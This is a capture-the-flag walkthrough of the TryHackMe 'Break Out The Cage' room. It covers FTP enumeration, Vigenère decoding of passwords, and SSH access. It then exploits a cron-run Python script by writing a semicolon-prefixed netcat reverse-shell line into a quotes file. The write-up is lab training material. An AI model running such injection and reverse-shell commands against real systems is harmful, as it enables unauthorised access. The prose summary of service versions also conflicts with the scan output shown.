# Break Out The Cage

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
Tags: Linux
Subscription type: Free
Description:
Help Cage bring back his acting career and investigate the nefarious goings on of his agent!
```

Room link: [https://tryhackme.com/room/breakoutthecage1](https://tryhackme.com/room/breakoutthecage1)

## Solution

Let's find out what his agent is up to....

### Check for services with nmap

We start by scanning the machine with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Break_Out_The_Cage]
└─$ export TARGET_IP=10.67.159.150

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Break_Out_The_Cage]
└─$ sudo nmap -sV -sC $TARGET_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-10 12:25 CET
Nmap scan report for 10.67.159.150
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.141.248
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.93 seconds
```

We have three services running:

- vsftpd 3.0.2 running on port 21
- OpenSSH 6.7p1 running on port 22
- Apache httpd running on port 80

### Enumerate the FTP service

Next, we check for interesting files on the FTP server

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Break_Out_The_Cage]
└─$ ftp anonymous@$TARGET_IP                                                                                                   
Connected to 10.67.159.150.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||21535|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
229 Entering Extended Passive Mode (|||33076|)
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
100% |****************************************************************************************************************************************************************|   396        2.89 KiB/s    00:00 ETA
226 Transfer complete.
396 bytes received in 00:00 (1.58 KiB/s)
ftp> quit
221 Goodbye.
```

We have a file called `dad_tasks` with the following contents

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Break_Out_The_Cage]
└─$ cat dad_tasks        
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds   
```

### What is Weston's password?

The contents looks Base64-encoded

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Break_Out_The_Cage]
└─$ cat dad_tasks | base64 -d
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl  
```

And this looks almost like ROT13-encoding

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Break_Out_The_Cage]
└─$ cat dad_tasks | base64 -d | rot13
Dncj Rrxpy - Cie EZXC...KMJ IJHE... GGV KRS... YNN METDEB!!!!
Fsj. Xnwazo kfv bjhbjtr
Snm. Gzy sxse dtfrvx nt bdrvok
Rywjk. Kvy odv nvxyoljdr
Efsi. Mjry iiz vzry fhzrog ydjqfsx
Lrwe. Gdray Ifj fiag "hedfwrgcjoa rvalwnzh" js.

Vm tyjj N lxsgrs.... Dwufiobhhbrkpzijxjjngsyykhtuuoopzlqvmjyxofvqvhfpjy   
```

But no. It wasn't!

If we analyse the ciphertext with [Boxentriq's Cipher Identifier](https://www.boxentriq.com/code-breaking/cipher-identifier) we find that the cipher is likely a [Vigenere Cipher]((https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher)).

Using [guballa.de's vigenère solver](https://www.guballa.de/vigenere-solver) with the default settings we get this plaintext

```text
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes  
```

The keyword used for the cipher is: `namelesstwo`

Answer: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`

### Connect as Weston via SSH

As hinted we can now try to connect as `weston` with the password `Mydadisghostrideraintthatcoolnocausehesonfirejokes` via SSH

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Break_Out_The_Cage]
└─$ ssh weston@$TARGET_IP  
The authenticity of host '10.67.159.150 (10.67.159.150)' can't be established.
ED25519 key fingerprint is SHA256:o7pzAxWHDEV8n+uNpDnQ+sjkkBvKP3UVlNw2MpzspBw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.67.159.150' (ED25519) to the list of known hosts.
weston@10.67.159.150's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 10 11:51:12 UTC 2026

  System load:  0.0                Processes:           95
  Usage of /:   20.3% of 19.56GB   Users logged in:     0
  Memory usage: 16%                IP address for ens5: 10.67.159.150
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


         __________
        /\____;;___\
       | /         /
       `. ())oo() .
        |\(%()*^^()^\
       %| |-%-------|
      % \ | %  ))   |
      %  \|%________|
       %%%%
Last login: Tue May 26 10:58:20 2020 from 192.168.247.1
weston@national-treasure:~$ 
```

### Enumeration

We are in and can start looking for the user flag

```bash
weston@national-treasure:~$ find / -type f -name user.txt 2>/dev/null
weston@national-treasure:~$ ls -la
total 16
drwxr-xr-x 4 weston weston 4096 May 26  2020 .
drwxr-xr-x 4 root   root   4096 May 26  2020 ..
lrwxrwxrwx 1 weston weston    9 May 26  2020 .bash_history -> /dev/null
drwx------ 2 weston weston 4096 May 26  2020 .cache
drwx------ 3 weston weston 4096 May 26  2020 .gnupg
weston@national-treasure:~$ cd .gnupg
weston@national-treasure:~/.gnupg$ ls -la
total 12
drwx------ 3 weston weston 4096 May 26  2020 .
drwxr-xr-x 4 weston weston 4096 May 26  2020 ..
drwx------ 2 weston weston 4096 May 26  2020 private-keys-v1.d
weston@national-treasure:~/.gnupg$ cd private-keys-v1.d/
weston@national-treasure:~/.gnupg/private-keys-v1.d$ ls -la
total 8
drwx------ 2 weston weston 4096 May 26  2020 .
drwx------ 3 weston weston 4096 May 26  2020 ..
weston@national-treasure:~/.gnupg/private-keys-v1.d$ cd ..
weston@national-treasure:~/.gnupg$ cd ..
weston@national-treasure:~$ 
```

Nothing obviuos in our home directory, but I noticed the following broadcast message

```bash
Broadcast message from cage@national-treasure (somewhere) (Sat Jan 10 11:57:01 
                                                                               
Sorry boss, but there's only two men I trust. One of them's me. The other's not you. — Con Air
```

So there is likely a cronjob or something similar running. Let's check for that!

```bash
weston@national-treasure:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
weston@national-treasure:~$ 
```

But no cronjob that stands out in the global crontab.

Let's continue our enumeration. How about `sudo` privileges?

```bash
weston@national-treasure:~$ sudo -l
[sudo] password for weston: 
Matching Defaults entries for weston on national-treasure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
weston@national-treasure:~$ file /usr/bin/bees
/usr/bin/bees: Bourne-Again shell script, ASCII text executable
weston@national-treasure:~$ cat /usr/bin/bees
#!/bin/bash

wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
weston@national-treasure:~$ ls -la /usr/bin/bees
-rwxr-xr-x 1 root root 56 May 25  2020 /usr/bin/bees
weston@national-treasure:~$ 
```

We can run the script `/usr/bin/bees` as root but unfortunately we can't write/modify the script.

Checking the groups we belong to with `id`, we can see that we also belongs to the `cage` group.

```bash
weston@national-treasure:~$ id
uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
weston@national-treasure:~$ 
```

And there are another user called `cage` as well.

```bash
weston@national-treasure:~$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 May 26  2020 .
drwxr-xr-x 24 root   root   4096 May 26  2020 ..
drwx------  7 cage   cage   4096 May 26  2020 cage
drwxr-xr-x  4 weston weston 4096 May 26  2020 weston
weston@national-treasure:~$ cat /etc/passwd | grep cage
cage:x:1000:1000:cage:/home/cage:/bin/bash
weston@national-treasure:~$ 
```

Let's check for interesting files belonging to the `cage` group

```bash
weston@national-treasure:~$ find / -type f -group cage 2>/dev/null
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
weston@national-treasure:~$ ls -l /opt/.dads_scripts/spread_the_quotes.py
-rwxr--r-- 1 cage cage 255 May 26  2020 /opt/.dads_scripts/spread_the_quotes.py
weston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)

weston@national-treasure:~$ 
```

Ah, we have found where the broadcast messages come from. A Python-script that displays quotes.

And the `.quotes` file is writeable by us

```bash
weston@national-treasure:~$ ls -l /opt/.dads_scripts/.files/.quotes
-rwxrw---- 1 cage cage 4204 May 25  2020 /opt/.dads_scripts/.files/.quotes
weston@national-treasure:~$ 
```

so we can use command injection to execute code from `os.system` in the script.  
How nice!

### Get a reverse shell

Time to get a reverse shell. First we create a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Break_Out_The_Cage]
└─$ nc -lvnp 12345
listening on [any] 12345 ...

```

Next, we modify the content of the `.quotes` file to contain a reverse shell instead

```bash
weston@national-treasure:~$ cd /opt/.dads_scripts/.files
weston@national-treasure:/opt/.dads_scripts/.files$ ls -la
total 16
drwxrwxr-x 2 cage cage 4096 May 25  2020 .
drwxr-xr-x 3 cage cage 4096 May 26  2020 ..
-rwxrw---- 1 cage cage 4204 May 25  2020 .quotes
weston@national-treasure:/opt/.dads_scripts/.files$ echo ';rm /tmp/cajac; mkfifo /tmp/cajac;cat /tmp/cajac|/bin/sh -i 2>&1|nc 192.168.141.248 12345 > /tmp/cajac' > .quotes
weston@national-treasure:/opt/.dads_scripts/.files$ cat .quotes 
;rm /tmp/cajac; mkfifo /tmp/cajac;cat /tmp/cajac|/bin/sh -i 2>&1|nc 192.168.141.248 12345 > /tmp/cajac
weston@national-treasure:/opt/.dads_scripts/.files$ 
```

Note the `;` first on the line that terminates/ends the `wall` command.

After a couple of minutes or so, we have a connection back at our netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Break_Out_The_Cage]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.141.248] from (UNKNOWN) [10.67.159.150] 50792
/bin/sh: 0: can't access tty; job control turned off
$ 
```

And we are running as `cage`

```bash
$ id
uid=1000(cage) gid=1000(cage) groups=1000(cage),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
$ 
```

We can see that the quote-script is running as a cron job every 3rd minute

```bash
$ pwd
/home/cage
$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

*/3 * * * * /opt/.dads_scripts/spread_the_quotes.py
$ 
```

We delete this cronjob so it won't interfere with our shell

```bash
$ crontab -r
$ crontab -l
no crontab for cage
$ 
```

### What's the user flag?

Now we can try to find the user flag (again)

```bash
$ ls -la
total 56
drwx------ 7 cage cage 4096 May 26  2020 .
drwxr-xr-x 4 root root 4096 May 26  2020 ..
lrwxrwxrwx 1 cage cage    9 May 26  2020 .bash_history -> /dev/null
-rw-r--r-- 1 cage cage  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cage cage 3771 Apr  4  2018 .bashrc
drwx------ 2 cage cage 4096 May 25  2020 .cache
drwxrwxr-x 2 cage cage 4096 May 25  2020 email_backup
drwx------ 3 cage cage 4096 May 25  2020 .gnupg
drwxrwxr-x 3 cage cage 4096 May 25  2020 .local
-rw-r--r-- 1 cage cage  807 Apr  4  2018 .profile
-rw-rw-r-- 1 cage cage   66 May 25  2020 .selected_editor
drwx------ 2 cage cage 4096 May 26  2020 .ssh
-rw-r--r-- 1 cage cage    0 May 25  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 cage cage  230 May 26  2020 Super_Duper_Checklist
-rw------- 1 cage cage 6761 May 26  2020 .viminfo
$ cat Super*
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{<REDACTED>}
$ 
```

And there we have the user flag!

Answer: `THM{<REDACTED>}`

### What's the root flag?

Next, we do some additional enumeration in the email backups

```bash
$ cd email_backup
$ ls -la
total 20
drwxrwxr-x 2 cage cage 4096 May 25  2020 .
drwx------ 7 cage cage 4096 May 26  2020 ..
-rw-rw-r-- 1 cage cage  431 May 25  2020 email_1
-rw-rw-r-- 1 cage cage  733 May 25  2020 email_2
-rw-rw-r-- 1 cage cage  745 May 25  2020 email_3
```

In the third email we find what could be a password (`haiinspsyanileph`)

```bash
$ cat email_3
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage

```

Maybe it is Vigenère encrypted as before? And it is.

Using CyberChef's Vigenère Decode recipe and the key `face` we get the password `cageisnotalegend`.

```bash
weston@national-treasure:/opt/.dads_scripts/.files$ 
weston@national-treasure:/opt/.dads_scripts/.files$ su -
Password: 
root@national-treasure:~# id
uid=0(root) gid=0(root) groups=0(root)
root@national-treasure:~# 
```

We are running as root and can start looking for the root flag.

```bash
root@national-treasure:~# ls -la
total 52
drwx------  8 root root  4096 May 26  2020 .
drwxr-xr-x 24 root root  4096 May 26  2020 ..
lrwxrwxrwx  1 root root     9 May 26  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 May 26  2020 .cache
drwxr-xr-x  2 root root  4096 May 25  2020 email_backup
drwx------  3 root root  4096 May 26  2020 .gnupg
drwxr-xr-x  3 root root  4096 May 25  2020 .local
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
drwx------  2 root root  4096 May 25  2020 .ssh
drwxr-xr-x  2 root root  4096 May 26  2020 .vim
-rw-------  1 root root 11692 May 26  2020 .viminfo
root@national-treasure:~# find / -type f -name root.txt
root@national-treasure:~# cd email_backup/
root@national-treasure:~/email_backup# ls -l
total 8
-rw-r--r-- 1 root root 318 May 25  2020 email_1
-rw-r--r-- 1 root root 414 May 25  2020 email_2
```

We have more emails to check.

```bash
root@national-treasure:~/email_backup# cat email_1 
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Sean Archer
root@national-treasure:~/email_backup# cat email_2
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{<REDACTED>}

Thank you

Sean Archer
root@national-treasure:~/email_backup# 
```

And there we have the final flag!

Answer: `THM{<REDACTED>}`

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [Cipher Identifier - Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier)
- [Code injection - Wikipedia](https://en.wikipedia.org/wiki/Code_injection)
- [cron - Wikipedia](https://en.wikipedia.org/wiki/Cron)
- [crontab - Linux manual page](https://man7.org/linux/man-pages/man1/crontab.1.html)
- [CyberChef - GitHub](https://github.com/gchq/CyberChef)
- [CyberChef - Homepage](https://gchq.github.io/CyberChef/)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [ftp - Linux manual page](https://linux.die.net/man/1/ftp)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Nmap - Wikipedia](https://en.wikipedia.org/wiki/Nmap)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [Vigenère cipher - Wikipedia](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher)
- [Vigenère Solver - guballa.de](https://www.guballa.de/vigenere-solver)
- [vsftpd - Wikipedia](https://en.wikipedia.org/wiki/Vsftpd)
- [wall - Linux manual page](https://man7.org/linux/man-pages/man1/wall.1.html)
